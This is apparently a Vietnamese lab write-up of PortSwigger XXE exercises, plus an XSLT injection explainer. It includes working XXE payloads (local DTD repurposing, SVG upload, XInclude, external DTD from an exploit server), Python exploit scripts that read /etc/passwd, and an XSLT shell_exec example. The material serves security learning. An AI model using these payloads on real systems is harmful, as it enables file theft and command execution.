- Khi truy cập đến URL này, ta sẽ lấy được nội dung của file /etc/hostname vào giá trị của biến x ta đưa trên URL

![image](https://hackmd.io/_uploads/H1mluul3T.png)

```xml!
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"https://exploit-0a540014042f10ef83f1325901360077.exploit-server.net/exploit/a.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

![image](https://hackmd.io/_uploads/Bk7uw_gn6.png)

![image](https://hackmd.io/_uploads/BJYFvdeha.png)

mục đích của chúng ta đã hoàn thành và mình đã solve được lab này

![image](https://hackmd.io/_uploads/HkWcvOe26.png)

## 6. Lab: Exploiting XXE to retrieve data by repurposing a local DTD

link: https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd

### Đề bài

![image](https://hackmd.io/_uploads/rJuHhDx2T.png)

### Phân tích

- Việc cho phép hệ thống tìm nạp các file external DTD thực sự nguy hiểm do kẻ tấn công có thể tự tạo các external DTD tùy ý. Bởi vậy, hiện nay nhiều hệ thống đã thực hiện chặn việc truy cập các external DTD. Tuy nhiên, kẻ tấn công vẫn có thể lợi dụng việc kích hoạt lỗi phân tích cú pháp với các file local DTD nhằm đọc nội dung file khi các dòng thông báo lỗi hiển thị giá trị input từ người dùng.
- Đối với mỗi hệ thống được sử dụng, các tệp local DTD thường được đặt ở các đường dẫn mặc định khác nhau.
- Trang web chứa lỗ hổng Blind XXE injection trong chức năng "Check stock". Biết rằng hệ thống sử dụng môi trường GNOME desktop và local DTD thường được đặt tại /usr/share/yelp/dtd/docbookx.dtd, trong đó chứa entity có tên ISOamso. Để hoàn thành bài lab, chúng ta cần tái sử dụng local DTD, kích hoạt lỗi phân tích cú pháp XML, từ đó đọc nội dung tệp /etc/passwd qua thông báo lỗi.

- Thực hiện kiểm tra DNS lookup thành công, xác định chức năng "Check stock" khả năng chứa lỗ hổng Blind XXE:

Trường hợp bài lab đưa ra không thực hiện filter các ký tự & và %:

![image](https://hackmd.io/_uploads/rk9B1de3a.png)

![image](https://hackmd.io/_uploads/SJ9zgOghp.png)

Thông báo lỗi trả về có thể lợi dụng nhằm hiển thị nội dung file bất kỳ.

Kiểm tra nhận thấy hệ thống không cho phép truy cập tới các external DTD:

![image](https://hackmd.io/_uploads/rJJagdlha.png)

![image](https://hackmd.io/_uploads/rksC1_ghT.png)

Khả năng hệ thống chứa danh sách white-list các host hoặc chỉ cho phép sử dụng local DTD. Chúng ta cần xác định vị trí local DTD, cần thử từng trường hợp với các system tương ứng, tuy nhiên bài lab đã cho biết hệ thống sử dụng môi trường GNOME desktop và địa chỉ local DTD tại `/usr/share/yelp/dtd/docbookx.dtd`.

![image](https://hackmd.io/_uploads/SyrEb_lna.png)

không hiện thông báo lỗi

### Khai thác

- Tiếp theo, chúng ta xây dựng payload tấn công như sau:
- mình tìm được payload này trên payloadallthethongs

![image](https://hackmd.io/_uploads/BygbG_ena.png)

mình dùng payload này

```xml!
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

- Parameter entity local_dtd chứa nội dung tệp `/usr/share/yelp/dtd/docbookx.dtd` là local DTD trên server.
- Parameter entity `ISOamso` chứa định nghĩa: parameter entity file chứa nội dung tệp `/etc/passwd`, parameter entity eval chứa định nghĩa parameter entity error chứa nội dung `/etc/passwd` sau khi tham chiếu tới `%file;`

![image](https://hackmd.io/_uploads/HkXpX_lha.png)

mình đã viết script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0aa500c803061455847b5bb5006f00c6.web-security-academy.net'

session=requests.Session()

data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [\r\n<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">\r\n<!ENTITY % ISOamso \'\r\n<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">\r\n<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">\r\n&#x25;eval;\r\n&#x25;error;\r\n\'>\r\n%local_dtd;\r\n]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'



response= session.post(
    url + '/product/stock',
    data=data,
    verify=False,
)

print(response.text)
```

![image](https://hackmd.io/_uploads/B1e73Dlhp.png)

mucjc đích của chúng ta đã hoàn thành và mình đã solve được lab này

![image](https://hackmd.io/_uploads/S1CBCvxna.png)

## 7. Lab: Exploiting XXE via image file upload

link: https://viblo.asia/p/xxe-injection-vulnerabilities-lo-hong-xml-phan-6-oK9VyQd0VQR

### Đề bài

![image](https://hackmd.io/_uploads/BJ7eFOghp.png)

### Phân tich

- Lab trên cho phép người dùng comment và dùng thư viện Apache Batik để xử lý ảnh avatar. Để solve lab thì ta sẽ upload ảnh mà chứa nội dung của /etc/hostname sau khi xử lý. Với hint là ảnh SVG sử dụng XML

mình vào payloadallthing tìm và được payload

![image](https://hackmd.io/_uploads/Byj8qdenp.png)

### Khai thác

- mình tạo payload với nội dung

```xml!
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

- Trong đó định nghĩa một entity xxe chứa nội dung tệp /etc/hostname và hiển thị nội dung ra ảnh với kích thước theo ý.
- mình sửa đuôi file ảnh thành `.svg` và content-type thành: `image/svg+xml`

![image](https://hackmd.io/_uploads/ryyWndehT.png)

- ảnh được up thành công

![image](https://hackmd.io/_uploads/r1ebyKxn6.png)

Truy cập ảnh vừa upload chúng ta thu được nội dung tệp /etc/hostname, submit và hoàn thành bài lab:

![image](https://hackmd.io/_uploads/BkD2nul3T.png)

![image](https://hackmd.io/_uploads/B14STuenp.png)

![image](https://hackmd.io/_uploads/H1EDA_lnp.png)

![image](https://hackmd.io/_uploads/SylsRul2a.png)

mục đích của chúng ta đã hoàn thành và mình đã solve được bài lab này

![image](https://hackmd.io/_uploads/rkAnAOghp.png)

## 8. Lab: Exploiting XInclude to retrieve files

link: https://portswigger.net/web-security/xxe/lab-xinclude-attack

### Phân tích

- Chức năng "Check stock" của trang web nhúng input từ người dùng vào một server-side XML document sau đó thực hiện phân tích cú pháp. Để hoàn thành bài lab, chúng ta cần inject một XInclude statement nhằm truy xuất nội dung tệp /etc/passwd.
- XInclude là một tính năng trong XML cho phép mình chèn và kết hợp các phần của các tài liệu XML khác vào trong một tài liệu XML chính. Nó sử dụng 2 phần tử chính:
  - `<xi:include>`: Đây là phần tử chính để thực hiện XInclude. Ta sử dụng phần tử này để tham chiếu đến tài liệu bạn muốn chèn vào. Phần tử này có một thuộc tính quan trọng là href, trong đó mình chỉ định đường dẫn đến tài liệu cần chèn.
  - `xmlns:xi`: Đây là một khai báo không gian tên (namespace declaration) dành riêng cho XInclude. Mình cần thêm khai báo này vào phần tử gốc của tài liệu XML để chỉ ra rằng bạn sử dụng các phần tử và thuộc tính của XInclude.

![image](https://hackmd.io/_uploads/ByWlfKe2a.png)

Nhập giá trị %26 (URL encode của ký tự &) cho tham số productId:

![image](https://hackmd.io/_uploads/BJ8tEtxhT.png)

Response trả về thông báo lỗi "Entities are not allowed for security reasons" cho thấy trang web chứa quá trình phân tích cú pháp XML.

### Khai thác

mình tìm được trên payloadallthethings

![image](https://hackmd.io/_uploads/rkZCXte2p.png)

- chúng ta sẽ khai báo sẽ sử dụng XInclude với phẩn tử này với: `<foo xmlns:xi="http://www.w3.org/2001/XInclude">`

- Cụ thể thì ta sẽ XML injection vào thuộc tính href của phần tử `<xi:include>` với payload: `<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>`
- ta cần thêm parse="text", vì mặc định XInclude sẽ parse file dưới dạng xml file, nên ta cần thêm thuộc tính này để cho trang web hiểu ta muốn parse theo dạng text, giờ ta đưa payload này vào productId là ta sẽ solve được

chúng ta truy cập với payload:

```xml!
productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=1
```

![image](https://hackmd.io/_uploads/rJs1Btghp.png)

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a8a00a104875f5e802f3aa000420093.web-security-academy.net'

session=requests.Session()

data = '''productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1'''



response= session.post(
    url + '/product/stock',
    data=data,
    verify=False,
)

print(response.text)
```

![image](https://hackmd.io/_uploads/SkJuSYenT.png)

mục đích của chúng ta đã hoàn thành và mình đã solve được lab này

![image](https://hackmd.io/_uploads/SkxirFl3p.png)

## 9. Lab: Exploiting blind XXE to retrieve data via error messages

link: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages

### Đề bài

![image](https://hackmd.io/_uploads/r1ftDYenp.png)

### Phân tích

- Chức năng "Check stock" của trang web thực hiện quá trình phân tích cú pháp dữ liệu XML nhưng không hiển thị bất kỳ kết quả nào ra giao diện. Tuy nhiên, khi quá trình phân tích gặp lỗi, các thông báo trả về chứa nội dung nhạy cảm. Để hoàn thành bài lab, chúng ta cần kích hoạt các thông báo lỗi nhằm đọc nội dung tệp tin /etc/passwd.
- Trong dữ liệu POST không được phép chứa ký tự `&`
  ![image](https://hackmd.io/_uploads/r10F_Fg2T.png)

- Do đó chúng ta không thể tự định nghĩa các entities thông thường. Tuy nhiên, ký tự % không bị filter:

![image](https://hackmd.io/_uploads/BybaOFx26.png)

### Khai thác

- ta sẽ host 1 file DTD tại đường dẫn `http://<EXPLOIT-SERVER>/exploit.dtd`. Mục tiêu bài này sẽ lấy được nội dung file `/etc/passwd` thông qua lỗi trả về. Do đó, `%error;` sẽ chứa nội dung một file không tồn tại, cụ thể là nội dung file /etc/passwd thông qua %file;. Khi đó, nếu server truy cập đường dẫn chứa file DTD này, server sẽ không có file `/<nội dung /etc/passwd>` và trả lỗi chứa nội dung `/etc/passwd`.

![image](https://hackmd.io/_uploads/Bki6YYg3T.png)

![image](https://hackmd.io/_uploads/ByBB5Fxha.png)

trang web đã chặn biến xxe và mình thay thành cuong và thành công solve được lab này

![image](https://hackmd.io/_uploads/r1DE5Yl3p.png)

mục đích của chúng ta đã hoàn thành và mình đã solve được lab này

![image](https://hackmd.io/_uploads/S1_d9tgna.png)

## Tìm hiểu thêm

### XSLT injection

- XSLT (eXtensible Stylesheet Language Transformations) là một stylesheet language có chức năng chính là chuyển đổi xml thành các định dạng khác để hiển thị.

Nếu HTML có CSS thì XML cũng có XSLT

![image](https://hackmd.io/_uploads/rJ3V6cy3p.png)

Thông thường XSLT sẽ chuyển đổi xml thành HTML để hiển thị một cách đẹp mắt và dễ dàng

![image](https://hackmd.io/_uploads/BJJDTcy2T.png)

Ví dụ:
example.xml:

```xml!
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
  <cd>
    <title>Empire Burlesque</title>
    <artist>Bob Dylan</artist>
    <country>USA</country>
    <company>Columbia</company>
    <price>10.90</price>
    <year>1985</year>
  </cd>
  <cd>
    <title>Hide your heart</title>
    <artist>Bonnie Tyler</artist>
    <country>UK</country>
    <company>CBS Records</company>
    <price>9.90</price>
    <year>1988</year>
  </cd>
  ...
</catalogc>
```

file example.xsl

```xml!
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<html>
<body>
  <h2>My CD Collection</h2>
  <table border="1">
    <tr bgcolor="#9acd32">
      <th style="text-align:left">Title</th>
      <th style="text-align:left">Artist</th>
    </tr>
    <xsl:for-each select="catalog/cd">
    <tr>
      <td><xsl:value-of select="title"/></td>
      <td><xsl:value-of select="artist"/></td>
    </tr>
    </xsl:for-each>
  </table>
</body>
</html>
</xsl:template>
</xsl:stylesheet>
```

Kết quả khi sử dụng example.xsl lên example.xml:

![image](https://hackmd.io/_uploads/ryrB0cy26.png)

Để có thể xử lý và render ra được kết quả như trên thì ta cần dùng XSLT processor, giống như để xử lý XML ta cần XML parser thì XSLT cũng vậy.

![image](https://hackmd.io/_uploads/rkFD0cy3a.png)

### XPath in XSLT

- Để có thể truy vấn dữ liệu trong xml để chuyển sang format khác, XSLT sẽ sử dụng XPATH trong attribute select
  Syntax:

```xml!
<xsl:value-of select="<XPATH>">
```

![image](https://hackmd.io/_uploads/SkdW1sJhT.png)

### document()

- Ta để ý công dụng của hàm document

![image](https://hackmd.io/_uploads/r1iBJoy26.png)

- Nó có thể đi ra ngoài để lấy node-set về

![image](https://hackmd.io/_uploads/r1pu1i1ha.png)

- sẽ ra sao nếu ta gọi đến một file trong hệ thống?

![image](https://hackmd.io/_uploads/B1bMbo1n6.png)

kết quả

![image](https://hackmd.io/_uploads/S1DxWjkha.png)

### RCE

XSLT còn cho phép ta gọi đến các PHP functions thông qua namespace. Vậy có nghĩa là nếu attacker gọi các hàm nhạy cảm như các hàm thực thi OS command thì sẽ rất nguy hiểm

```xml!
<?xml version ="1.0" encoding="UTF-8"?>
  <xsl:stylesheet version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:php="http://php.net/xsl">

      <xsl:output method="html" />
      <xsl:template match="/">
          <xsl:value-of select="php:function('shell_exec', 'id')" />
      </xsl:template>
  </xsl:stylesheet>
```

## Tham khảo thêm

- https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/
